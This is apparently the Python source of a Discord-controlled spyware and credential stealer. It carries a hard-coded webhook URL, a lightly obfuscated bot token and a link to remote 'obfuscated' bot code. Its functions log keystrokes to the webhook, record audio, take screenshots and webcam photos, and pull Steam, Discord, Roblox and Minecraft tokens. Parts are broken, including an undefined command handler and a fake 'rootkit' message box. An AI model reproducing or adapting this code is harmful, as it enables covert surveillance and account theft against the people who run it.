import discord
import asyncio
import requests
import json
import os
import threading
from discord.ext import commands
from pynput.keyboard import Listener, Key
import wave
import pyaudio
import cv2
from PIL import ImageGrab
import time
from Crypto.Cipher import AES
import base64
import logging
import shutil
import ctypes  # âœ… Fix: needed for MessageBoxA

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg"[::-1] + ".oF0Ep8O1x3LEe96eNd5lf0Frfx6q9Jq0KqBJFA"[::-1]
BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/obfuscated%20BOT%20CODE.txt"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

logging.basicConfig(level=logging.DEBUG)

def send_to_discord(message):
    try:
        payload = {"content": message}
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            logging.info("Data sent to Discord successfully")
        else:
            logging.error(f"Failed to send data to Discord: {response.status_code}")
    except Exception as e:
        logging.error(f"Webhook failed: {e}")

def log_keystroke(key):
    try:
        key_str = str(key).replace("'", "")
        if "Key" not in key_str:
            logging.info(key_str)
            send_to_discord(key_str)
    except Exception as e:
        logging.error(f"Keylogging failed: {e}")

def start_keylogger():
    def on_press(key):
        try:
            log_keystroke(key)
        except Exception as e:
            logging.error(f"Keylogger failed: {e}")
            return False  # exit listener
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        logging.error(f"Keylogger listener error: {e}")

def safe_clipboard_check():
    try:
        return ImageGrab.grabclipboard()
    except Exception:
        return None  # silently ignore clipboard errors

def record_audio(duration=30):
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for i in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        filename = f"audio_{int(time.time())}.wav"
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(44100)
            wf.writeframes(b''.join(frames))
        send_to_discord(f"Audio recorded and saved as {filename}")
    except Exception as e:
        logging.error(f"Audio recording failed: {e}")

def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        filename = f"screenshot_{int(time.time())}.png"
        screenshot.save(filename)
        send_to_discord(f"Screenshot captured successfully: {filename}")
    except Exception as e:
        logging.error(f"Screenshot capture failed: {e}")

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            filename = f"webcam_{int(time.time())}.png"
            cv2.imwrite(filename, frame)
            send_to_discord(f"Webcam photo saved as {filename}")
            cap.release()
    except Exception as e:
        logging.error(f"Webcam capture failed: {e}")

def steam_dump():
    try:
        steam_token = None
        steam_path = os.path.join(os.getenv('APPDATA'), 'Steam', 'userdata')
        for root, dirs, files in os.walk(steam_path):
            for file in files:
                if file == 'loginusers.vdf':
                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                        data = f.read()
                        if 'steamid' in data:
                            steam_token = data.split('steamid')[1].split('"')[1]
                            send_to_discord(f"Steam token found: {steam_token}")
        if not steam_token:
            send_to_discord("No Steam token found.")
    except Exception as e:
        logging.error(f"Steam dump failed: {e}")

def discord_dump():
    try:
        discord_token = None
        appdata = os.getenv('APPDATA')
        for root, dirs, files in os.walk(appdata):
            for file in files:
                if file == 'Local\Discord\app-0.0.309\settings.json':
                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                        data = f.read()
                        if 'token' in data:
                            discord_token = data.split('token')[1].split('"')[1]
                            send_to_discord(f"Discord token found: {discord_token}")
        if not discord_token:
            send_to_discord("No Discord token found.")
    except Exception as e:
        logging.error(f"Discord dump failed: {e}")

def roblox_dump():
    try:
        roblox_token = None
        roblox_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Roblox', 'ClientSettings')
        for root, dirs, files in os.walk(roblox_path):
            for file in files:
                if file == 'client-settings.json':
                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                        data = f.read()
                        if 'cookie' in data:
                            roblox_token = data.split('cookie')[1].split('"')[1]
                            send_to_discord(f"Roblox token found: {roblox_token}")
        if not roblox_token:
            send_to_discord("No Roblox token found.")
    except Exception as e:
        logging.error(f"Roblox dump failed: {e}")

def minecraft_dump():
    try:
        minecraft_token = None
        minecraft_path = os.path.join(os.getenv('APPDATA'), '.minecraft', 'launcher_profiles.json')
        if os.path.exists(minecraft_path):
            with open(minecraft_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if 'auth_player_name' in data:
                    minecraft_token = data['auth_player_name']
                    send_to_discord(f"Minecraft session found: {minecraft_token}")
        if not minecraft_token:
            send_to_discord("No Minecraft token found.")
    except Exception as e:
        logging.error(f"Minecraft dump failed: {e}")

def exfiltrate_files():
    try:
        files = [f for f in os.listdir() if f.endswith('.txt')]
        for file in files:
            send_to_discord(f"Exfiltrated file: {file}")
    except Exception as e:
        logging.error(f"File exfiltration failed: {e}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    cmd = message.content.strip().lstrip("!")
    asyncio.create_task(handle_command(cmd))  # send command for processing

def apply_rootkit_technique():
    try:
        ctypes.windll.user32.MessageBoxW(0, "Rootkit Technique Active", "System Alert", 1)
    except Exception as e:
        logging.error(f"Failed to apply rootkit technique: {e}")

async def setup():
    apply_rootkit_technique()
    await bot.start(TOKEN)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.create_task(setup())
    loop.run_forever()
